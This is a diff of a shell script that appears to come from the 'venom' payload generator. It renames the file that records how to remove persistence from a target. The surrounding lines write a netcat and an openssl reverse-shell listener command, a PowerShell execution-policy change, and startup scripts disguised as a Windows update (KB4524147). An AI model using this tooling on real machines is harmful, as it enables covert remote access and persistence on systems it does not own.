@@ -12386,22 +12386,22 @@ dtr=$(date)
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LHOST: $lhost" > $IPATH/output/delete_persistence_$random_name.txt
-   echo "HANDLER: cd venom/output" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "HANDLER: sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "ACTIVE ON: $dtr" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/delete_persistence_$random_name.txt
+   echo "LHOST: $lhost" > $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "HANDLER: cd venom/output" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "HANDLER: sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "ACTIVE ON: $dtr" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/delete_persistence_ID_$random_name.txt
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/delete_persistence_$random_name.txt
+      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/delete_persistence_ID_$random_name.txt
    else
-      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence_$random_name.txt
+      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence_ID_$random_name.txt
    fi
-   echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence_$random_name.txt
-   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence_$random_name.txt" --info > /dev/null 2>&1
+   echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence_ID_$random_name.txt" --info > /dev/null 2>&1
 fi
 sh_menu
 }
@@ -12605,21 +12605,21 @@ dtr=$(date)
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LHOST: $lhost" > $IPATH/output/delete_persistence_$random_name.txt
-   echo "HANDLER: sudo nc -lvp $lport" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "ACTIVE ON: $dtr" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/delete_persistence_$random_name.txt
+   echo "LHOST: $lhost" > $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "HANDLER: sudo nc -lvp $lport" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "ACTIVE ON: $dtr" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/delete_persistence_ID_$random_name.txt
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/delete_persistence_$random_name.txt
+      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/delete_persistence_ID_$random_name.txt
    else
-      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence_$random_name.txt
+      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence_ID_$random_name.txt
    fi
-   echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence_$random_name.txt
-   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence_$random_name.txt" --info > /dev/null 2>&1
+   echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence_ID_$random_name.txt
+   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence_ID_$random_name.txt" --info > /dev/null 2>&1
 fi
 sh_menu
 }
